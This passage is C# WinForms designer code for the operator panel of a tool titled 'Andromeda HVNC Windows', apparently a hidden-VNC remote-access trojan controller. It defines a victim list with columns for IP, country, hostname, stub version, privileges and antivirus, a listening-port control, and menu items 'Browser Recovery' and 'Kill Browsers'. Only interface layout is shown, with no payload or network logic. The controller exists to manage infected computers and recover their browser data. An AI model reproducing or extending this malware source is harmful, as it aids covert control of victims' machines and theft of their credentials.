            this.BrowserRecovery.Click += new System.EventHandler(this.browserRecoveryToolStripMenuItem_Click);
            // 
            // killBrowsersToolStripMenuItem1
            // 
            this.killBrowsersToolStripMenuItem1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(131)))), ((int)(((byte)(190)))), ((int)(((byte)(235)))));
            this.killBrowsersToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("killBrowsersToolStripMenuItem1.Image")));
            this.killBrowsersToolStripMenuItem1.Name = "killBrowsersToolStripMenuItem1";
            this.killBrowsersToolStripMenuItem1.Size = new System.Drawing.Size(208, 32);
            this.killBrowsersToolStripMenuItem1.Text = "Kill Browsers";
            this.killBrowsersToolStripMenuItem1.Click += new System.EventHandler(this.killBrowsersToolStripMenuItem1_Click);
            // 
            // guna2DragControl1
            // 
            this.guna2DragControl1.DockIndicatorTransparencyValue = 0.6D;
            this.guna2DragControl1.TargetControl = this.Menu_Painel;
            this.guna2DragControl1.UseTransparentDrag = true;
            // 
            // Menu_Painel
            // 
            this.Menu_Painel.Controls.Add(this.guna2ControlBox1);
            this.Menu_Painel.Controls.Add(this.guna2CirclePictureBox4);
            this.Menu_Painel.Controls.Add(this.Guna2Panel2);
            this.Menu_Painel.Controls.Add(this.Guna2CirclePictureBox2);
            this.Menu_Painel.Controls.Add(this.Guna2HtmlLabel71);
            this.Menu_Painel.Controls.Add(this.Guna2CirclePictureBox1);
            this.Menu_Painel.Controls.Add(this.StatusPanel);
            this.Menu_Painel.CustomizableEdges.TopLeft = false;
            this.Menu_Painel.CustomizableEdges.TopRight = false;
            this.Guna2Transition1.SetDecoration(this.Menu_Painel, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Menu_Painel, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Menu_Painel.Dock = System.Windows.Forms.DockStyle.Top;
            this.Menu_Painel.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Menu_Painel.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Menu_Painel.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.Menu_Painel.Location = new System.Drawing.Point(224, 0);
            this.Menu_Painel.Name = "Menu_Painel";
            this.Menu_Painel.Size = new System.Drawing.Size(1084, 73);
            this.Menu_Painel.TabIndex = 155;
            // 
            // guna2ControlBox1
            // 
            this.guna2ControlBox1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2ControlBox1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(59)))), ((int)(((byte)(213)))), ((int)(((byte)(89)))));
            this.guna2ControlBox1.BorderColor = System.Drawing.Color.Transparent;
            this.guna2ControlBox1.BorderRadius = 3;
            this.guna2ControlBox1.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MinimizeBox;
            this.Guna2Transition1.SetDecoration(this.guna2ControlBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2ControlBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2ControlBox1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(59)))), ((int)(((byte)(213)))), ((int)(((byte)(89)))));
            this.guna2ControlBox1.IconColor = System.Drawing.Color.FromArgb(((int)(((byte)(59)))), ((int)(((byte)(213)))), ((int)(((byte)(89)))));
            this.guna2ControlBox1.Location = new System.Drawing.Point(1000, 31);
            this.guna2ControlBox1.Name = "guna2ControlBox1";
            this.guna2ControlBox1.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(59)))), ((int)(((byte)(213)))), ((int)(((byte)(89)))));
            this.guna2ControlBox1.Size = new System.Drawing.Size(10, 10);
            this.guna2ControlBox1.TabIndex = 134;
            // 
            // guna2CirclePictureBox4
            // 
            this.guna2CirclePictureBox4.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2CirclePictureBox4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2CirclePictureBox4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2CirclePictureBox4.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(59)))), ((int)(((byte)(213)))), ((int)(((byte)(89)))));
            this.guna2CirclePictureBox4.ImageRotate = 0F;
            this.guna2CirclePictureBox4.Location = new System.Drawing.Point(996, 27);
            this.guna2CirclePictureBox4.Name = "guna2CirclePictureBox4";
            this.guna2CirclePictureBox4.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
            this.guna2CirclePictureBox4.Size = new System.Drawing.Size(18, 18);
            this.guna2CirclePictureBox4.TabIndex = 135;
            this.guna2CirclePictureBox4.TabStop = false;
            // 
            // Guna2Panel2
            // 
            this.Guna2Transition1.SetDecoration(this.Guna2Panel2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2Panel2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Panel2.Location = new System.Drawing.Point(1015, 72);
            this.Guna2Panel2.Name = "Guna2Panel2";
            this.Guna2Panel2.Size = new System.Drawing.Size(69, 592);
            this.Guna2Panel2.TabIndex = 94;
            // 
            // Guna2CirclePictureBox2
            // 
            this.Guna2Transition1.SetDecoration(this.Guna2CirclePictureBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2CirclePictureBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2CirclePictureBox2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(254)))), ((int)(((byte)(200)))), ((int)(((byte)(43)))));
            this.Guna2CirclePictureBox2.ImageRotate = 0F;
            this.Guna2CirclePictureBox2.Location = new System.Drawing.Point(1021, 27);
            this.Guna2CirclePictureBox2.Name = "Guna2CirclePictureBox2";
            this.Guna2CirclePictureBox2.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
            this.Guna2CirclePictureBox2.Size = new System.Drawing.Size(18, 18);
            this.Guna2CirclePictureBox2.TabIndex = 1;
            this.Guna2CirclePictureBox2.TabStop = false;
            // 
            // Guna2HtmlLabel71
            // 
            this.Guna2HtmlLabel71.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel71, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel71, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel71.Font = new System.Drawing.Font("Segoe UI Semibold", 13F, System.Drawing.FontStyle.Bold);
            this.Guna2HtmlLabel71.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(131)))), ((int)(((byte)(190)))), ((int)(((byte)(235)))));
            this.Guna2HtmlLabel71.Location = new System.Drawing.Point(6, 28);
            this.Guna2HtmlLabel71.Name = "Guna2HtmlLabel71";
            this.Guna2HtmlLabel71.Size = new System.Drawing.Size(221, 25);
            this.Guna2HtmlLabel71.TabIndex = 97;
            this.Guna2HtmlLabel71.Text = "Andromeda HVNC Windows";
            // 
            // Guna2CirclePictureBox1
            // 
            this.Guna2Transition1.SetDecoration(this.Guna2CirclePictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2CirclePictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2CirclePictureBox1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(254)))), ((int)(((byte)(122)))), ((int)(((byte)(109)))));
            this.Guna2CirclePictureBox1.ImageRotate = 0F;
            this.Guna2CirclePictureBox1.Location = new System.Drawing.Point(1047, 27);
            this.Guna2CirclePictureBox1.Name = "Guna2CirclePictureBox1";
            this.Guna2CirclePictureBox1.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
            this.Guna2CirclePictureBox1.Size = new System.Drawing.Size(18, 18);
            this.Guna2CirclePictureBox1.TabIndex = 0;
            this.Guna2CirclePictureBox1.TabStop = false;
            this.Guna2CirclePictureBox1.Click += new System.EventHandler(this.Guna2CirclePictureBox1_Click);
            // 
            // StatusPanel
            // 
            this.StatusPanel.BackColor = System.Drawing.Color.Black;
            this.StatusPanel.Controls.Add(this.StatusPort);
            this.StatusPanel.Cursor = System.Windows.Forms.Cursors.SizeNS;
            this.Guna2Transition1.SetDecoration(this.StatusPanel, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.StatusPanel, Guna.UI2.AnimatorNS.DecorationType.None);
            this.StatusPanel.ForeColor = System.Drawing.Color.White;
            this.StatusPanel.Location = new System.Drawing.Point(453, -70);
            this.StatusPanel.Name = "StatusPanel";
            this.StatusPanel.Size = new System.Drawing.Size(47, 10);
            this.StatusPanel.TabIndex = 2;
            // 
            // StatusPort
            // 
            this.StatusPort.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.StatusPort.AutoSize = true;
            this.guna2Transition2.SetDecoration(this.StatusPort, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.StatusPort, Guna.UI2.AnimatorNS.DecorationType.None);
            this.StatusPort.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StatusPort.ForeColor = System.Drawing.Color.Gainsboro;
            this.StatusPort.Location = new System.Drawing.Point(13, 0);
            this.StatusPort.Name = "StatusPort";
            this.StatusPort.Size = new System.Drawing.Size(71, 15);
            this.StatusPort.TabIndex = 152;
            this.StatusPort.Text = "Enable Port";
            // 
            // StartPort
            // 
            this.StartPort.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.StartPort.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
            this.StartPort.CheckedState.BorderRadius = 1;
            this.StartPort.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.StartPort.CheckedState.InnerBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(97)))), ((int)(((byte)(128)))));
            this.StartPort.CheckedState.InnerBorderRadius = 1;
            this.StartPort.CheckedState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(97)))), ((int)(((byte)(128)))));
            this.Guna2Transition1.SetDecoration(this.StartPort, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.StartPort, Guna.UI2.AnimatorNS.DecorationType.None);
            this.StartPort.Location = new System.Drawing.Point(223, 484);
            this.StartPort.Name = "StartPort";
            this.StartPort.Size = new System.Drawing.Size(65, 25);
            this.StartPort.TabIndex = 151;
            this.StartPort.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
            this.StartPort.UncheckedState.BorderRadius = 1;
            this.StartPort.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.StartPort.UncheckedState.InnerBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(116)))), ((int)(((byte)(167)))));
            this.StartPort.UncheckedState.InnerBorderRadius = 1;
            this.StartPort.UncheckedState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(116)))), ((int)(((byte)(167)))));
            this.StartPort.CheckedChanged += new System.EventHandler(this.StartPort_CheckedChanged_1);
            this.StartPort.Click += new System.EventHandler(this.HVNCListenBtn_Click_1);
            // 
            // ListenPort
            // 
            this.ListenPort.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.ListenPort.BackColor = System.Drawing.Color.Transparent;
            this.ListenPort.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
            this.ListenPort.BorderThickness = 3;
            this.ListenPort.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.Guna2Transition1.SetDecoration(this.ListenPort, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.ListenPort, Guna.UI2.AnimatorNS.DecorationType.None);
            this.ListenPort.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.ListenPort.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.ListenPort.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.ListenPort.Location = new System.Drawing.Point(29, 483);
            this.ListenPort.Maximum = new decimal(new int[] {
            65553,
            0,
            0,
            0});
            this.ListenPort.Minimum = new decimal(new int[] {
            1025,
            0,
            0,
            0});
            this.ListenPort.Name = "ListenPort";
            this.ListenPort.Size = new System.Drawing.Size(188, 28);
            this.ListenPort.TabIndex = 153;
            this.ListenPort.UpDownButtonFillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.ListenPort.Value = new decimal(new int[] {
            9090,
            0,
            0,
            0});
            // 
            // imageList2
            // 
            this.imageList2.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imageList2.ImageStream")));
            this.imageList2.TransparentColor = System.Drawing.Color.Transparent;
            this.imageList2.Images.SetKeyName(0, "connected_480px.png");
            this.imageList2.Images.SetKeyName(1, "disconnected_480px.png");
            // 
            // HVNCList
            // 
            this.HVNCList.Activation = System.Windows.Forms.ItemActivation.OneClick;
            this.HVNCList.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.HVNCList.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.HVNCList.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader3,
            this.columnHeader2,
            this.columnHeader1,
            this.columnHeader4,
            this.columnHeader5,
            this.columnHeader7,
            this.columnHeader6,
            this.columnHeader8,
            this.columnHeader9});
            this.HVNCList.ContextMenuStrip = this.contextMenuStrip1;
            this.Guna2Transition1.SetDecoration(this.HVNCList, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.HVNCList, Guna.UI2.AnimatorNS.DecorationType.None);
            this.HVNCList.Dock = System.Windows.Forms.DockStyle.Fill;
            this.HVNCList.ForeColor = System.Drawing.Color.White;
            this.HVNCList.FullRowSelect = true;
            this.HVNCList.HideSelection = false;
            this.HVNCList.LabelEdit = true;
            this.HVNCList.Location = new System.Drawing.Point(0, 0);
            this.HVNCList.Name = "HVNCList";
            this.HVNCList.Size = new System.Drawing.Size(1084, 738);
            this.HVNCList.SmallImageList = this.imageList1;
            this.HVNCList.TabIndex = 7;
            this.HVNCList.UseCompatibleStateImageBehavior = false;
            this.HVNCList.View = System.Windows.Forms.View.Details;
            // 
            // columnHeader3
            // 
            this.columnHeader3.Text = "IP Address";
            this.columnHeader3.Width = 115;
            // 
            // columnHeader2
            // 
            this.columnHeader2.Text = "Group";
            this.columnHeader2.Width = 90;
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "Country";
            // 
            // columnHeader4
            // 
            this.columnHeader4.Text = "Hostname";
            this.columnHeader4.Width = 120;
            // 
            // columnHeader5
            // 
            this.columnHeader5.Text = "OS";
            this.columnHeader5.Width = 100;
            // 
            // columnHeader7
            // 
            this.columnHeader7.Text = "Stub Version";
            this.columnHeader7.Width = 100;
            // 
            // columnHeader6
            // 
            this.columnHeader6.Text = "Active From";
            this.columnHeader6.Width = 100;
            // 
            // columnHeader8
            // 
            this.columnHeader8.Text = "Privileges";
            this.columnHeader8.Width = 101;
            // 
            // columnHeader9
            // 
            this.columnHeader9.Text = "Anti-Virus";
            this.columnHeader9.Width = 298;
            // 
            // panel2
            // 
            this.panel2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(50)))), ((int)(((byte)(69)))));
            this.panel2.Controls.Add(this.ClientsOnline);
            this.panel2.Controls.Add(this.guna2ResizeBox2);
            this.Guna2Transition1.SetDecoration(this.panel2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.panel2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.panel2.Location = new System.Drawing.Point(-33, 729);
            this.panel2.Name = "panel2";
            this.panel2.Size = new System.Drawing.Size(10, 25);
            this.panel2.TabIndex = 9;
            // 
            // ClientsOnline
            // 
            this.ClientsOnline.AutoSize = true;
            this.guna2Transition2.SetDecoration(this.ClientsOnline, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.ClientsOnline, Guna.UI2.AnimatorNS.DecorationType.None);
            this.ClientsOnline.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ClientsOnline.ForeColor = System.Drawing.Color.Silver;
            this.ClientsOnline.Location = new System.Drawing.Point(4, 4);
            this.ClientsOnline.Name = "ClientsOnline";
            this.ClientsOnline.Size = new System.Drawing.Size(53, 15);
            this.ClientsOnline.TabIndex = 6;
            this.ClientsOnline.Text = "Online 0";
            // 
            // guna2ResizeBox2
            // 
            this.guna2ResizeBox2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2ResizeBox2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(50)))), ((int)(((byte)(69)))));
            this.Guna2Transition1.SetDecoration(this.guna2ResizeBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2ResizeBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2ResizeBox2.FillColor = System.Drawing.Color.Gainsboro;
            this.guna2ResizeBox2.ForeColor = System.Drawing.Color.Black;
            this.guna2ResizeBox2.Location = new System.Drawing.Point(-13, 3);
            this.guna2ResizeBox2.Name = "guna2ResizeBox2";
            this.guna2ResizeBox2.Size = new System.Drawing.Size(20, 20);
            this.guna2ResizeBox2.TabIndex = 5;
            this.guna2ResizeBox2.TargetControl = this;
            // 
            // guna2BorderlessForm1
            // 
            this.guna2BorderlessForm1.BorderRadius = 10;
            this.guna2BorderlessForm1.ContainerControl = this;
            this.guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6D;
            this.guna2BorderlessForm1.ShadowColor = System.Drawing.Color.DimGray;
            this.guna2BorderlessForm1.TransparentWhileDrag = true;
            // 
            // HVNCListenBtn
            // 
            this.HVNCListenBtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.HVNCListenBtn.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.portToolStripMenuItem,
            this.HVNCListenPort,
            this.toolStripSeparator3});
            this.HVNCListenBtn.Image = ((System.Drawing.Image)(resources.GetObject("HVNCListenBtn.Image")));
            this.HVNCListenBtn.Name = "HVNCListenBtn";
            this.HVNCListenBtn.Size = new System.Drawing.Size(189, 32);
            this.HVNCListenBtn.Text = "listening Port";
            this.HVNCListenBtn.Click += new System.EventHandler(this.HVNCListenBtn_Click_1);
            // 
            // portToolStripMenuItem
            // 
            this.portToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("portToolStripMenuItem.Image")));
            this.portToolStripMenuItem.Name = "portToolStripMenuItem";
            this.portToolStripMenuItem.Size = new System.Drawing.Size(160, 22);
            this.portToolStripMenuItem.Text = "Port :";
            // 
            // HVNCListenPort
            // 
            this.HVNCListenPort.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.HVNCListenPort.Name = "HVNCListenPort";
            this.HVNCListenPort.Size = new System.Drawing.Size(100, 23);
            this.HVNCListenPort.Text = "9031";
            // 
            // toolStripSeparator3
            // 
            this.toolStripSeparator3.Name = "toolStripSeparator3";
            this.toolStripSeparator3.Size = new System.Drawing.Size(157, 6);
            // 
            // Painel_Menu
            // 
            this.Painel_Menu.BackColor = System.Drawing.Color.Transparent;
            this.Painel_Menu.BorderStyle = System.Drawing.Drawing2D.DashStyle.Custom;
            this.Painel_Menu.Controls.Add(this.Guna2HtmlLabel60);
            this.Painel_Menu.Controls.Add(this.Guna2PictureBox27);
            this.Painel_Menu.Controls.Add(this.Guna2PictureBox21);
            this.Painel_Menu.Controls.Add(this.Guna2GradientButton8);
            this.Painel_Menu.Controls.Add(this.Guna2HtmlLabel85);
            this.Painel_Menu.Controls.Add(this.Guna2GradientButton2);
            this.Painel_Menu.Controls.Add(this.Guna2GradientButton1);
            this.Painel_Menu.Controls.Add(this.Guna2GradientButton3);
            this.Painel_Menu.Controls.Add(this.Guna2GradientButton7);
            this.Painel_Menu.Controls.Add(this.Guna2GradientButton6);
            this.Painel_Menu.Controls.Add(this.Guna2PictureBox1);
            this.Painel_Menu.Controls.Add(this.Guna2GradientButton4);
            this.Painel_Menu.Controls.Add(this.PortText);
            this.Painel_Menu.CustomizableEdges.BottomLeft = false;
            this.Painel_Menu.CustomizableEdges.BottomRight = false;
            this.Guna2Transition1.SetDecoration(this.Painel_Menu, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Painel_Menu, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Painel_Menu.Dock = System.Windows.Forms.DockStyle.Left;
            this.Painel_Menu.FillColor = System.Drawing.Color.Black;
            this.Painel_Menu.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Painel_Menu.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.Painel_Menu.Location = new System.Drawing.Point(0, 0);
            this.Painel_Menu.Name = "Painel_Menu";
            this.Painel_Menu.Size = new System.Drawing.Size(224, 811);
            this.Painel_Menu.TabIndex = 154;
            this.Painel_Menu.UseTransparentBackground = true;
            // 
            // Guna2HtmlLabel60
            // 
            this.Guna2HtmlLabel60.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel60, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel60, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel60.Font = new System.Drawing.Font("Segoe UI Semibold", 10F, System.Drawing.FontStyle.Bold);
            this.Guna2HtmlLabel60.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(131)))), ((int)(((byte)(190)))), ((int)(((byte)(235)))));
            this.Guna2HtmlLabel60.Location = new System.Drawing.Point(67, 707);
            this.Guna2HtmlLabel60.Name = "Guna2HtmlLabel60";
            this.Guna2HtmlLabel60.Size = new System.Drawing.Size(90, 19);
            this.Guna2HtmlLabel60.TabIndex = 103;
            this.Guna2HtmlLabel60.Text = "Team Brazilian";
            // 
            // Guna2PictureBox27
            // 
            this.Guna2PictureBox27.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox27, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox27, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox27.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox27.Image")));
            this.Guna2PictureBox27.ImageRotate = 0F;
            this.Guna2PictureBox27.Location = new System.Drawing.Point(92, 662);
            this.Guna2PictureBox27.Name = "Guna2PictureBox27";
            this.Guna2PictureBox27.Size = new System.Drawing.Size(40, 40);
            this.Guna2PictureBox27.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox27.TabIndex = 102;
            this.Guna2PictureBox27.TabStop = false;
            this.Guna2PictureBox27.UseTransparentBackground = true;
            // 
            // Guna2PictureBox21
            // 
            this.Guna2PictureBox21.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox21, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox21, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox21.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox21.Image")));
            this.Guna2PictureBox21.ImageRotate = 0F;
            this.Guna2PictureBox21.Location = new System.Drawing.Point(97, 170);
            this.Guna2PictureBox21.Name = "Guna2PictureBox21";
            this.Guna2PictureBox21.Size = new System.Drawing.Size(30, 30);
            this.Guna2PictureBox21.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox21.TabIndex = 68;
            this.Guna2PictureBox21.TabStop = false;
            this.Guna2PictureBox21.UseTransparentBackground = true;
            // 
            // Guna2GradientButton8
            // 
            this.Guna2Transition1.SetDecoration(this.Guna2GradientButton8, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2GradientButton8, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2GradientButton8.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton8.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton8.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton8.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton8.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.Guna2GradientButton8.FillColor = System.Drawing.Color.Transparent;
            this.Guna2GradientButton8.FillColor2 = System.Drawing.Color.Transparent;
            this.Guna2GradientButton8.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2GradientButton8.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(82)))), ((int)(((byte)(43)))), ((int)(((byte)(235)))));
            this.Guna2GradientButton8.Image = ((System.Drawing.Image)(resources.GetObject("Guna2GradientButton8.Image")));
            this.Guna2GradientButton8.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.Guna2GradientButton8.Location = new System.Drawing.Point(3, 565);
            this.Guna2GradientButton8.Name = "Guna2GradientButton8";
            this.Guna2GradientButton8.Size = new System.Drawing.Size(215, 45);
            this.Guna2GradientButton8.TabIndex = 101;
            this.Guna2GradientButton8.Text = "Sobre Andromeda";
            this.Guna2GradientButton8.Click += new System.EventHandler(this.Guna2GradientButton8_Click);
            // 
            // Guna2HtmlLabel85
            // 
            this.Guna2HtmlLabel85.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel85, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel85, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel85.Font = new System.Drawing.Font("Segoe UI Semibold", 11F, System.Drawing.FontStyle.Bold);
            this.Guna2HtmlLabel85.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel85.Location = new System.Drawing.Point(102, 737);
            this.Guna2HtmlLabel85.Name = "Guna2HtmlLabel85";
            this.Guna2HtmlLabel85.Size = new System.Drawing.Size(21, 22);
            this.Guna2HtmlLabel85.TabIndex = 100;
            this.Guna2HtmlLabel85.Text = "V5";
            // 
            // Guna2GradientButton2
            // 
            this.Guna2Transition1.SetDecoration(this.Guna2GradientButton2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2GradientButton2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2GradientButton2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton2.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton2.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.Guna2GradientButton2.FillColor = System.Drawing.Color.Transparent;
            this.Guna2GradientButton2.FillColor2 = System.Drawing.Color.Transparent;
            this.Guna2GradientButton2.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2GradientButton2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(82)))), ((int)(((byte)(43)))), ((int)(((byte)(235)))));
            this.Guna2GradientButton2.Image = ((System.Drawing.Image)(resources.GetObject("Guna2GradientButton2.Image")));
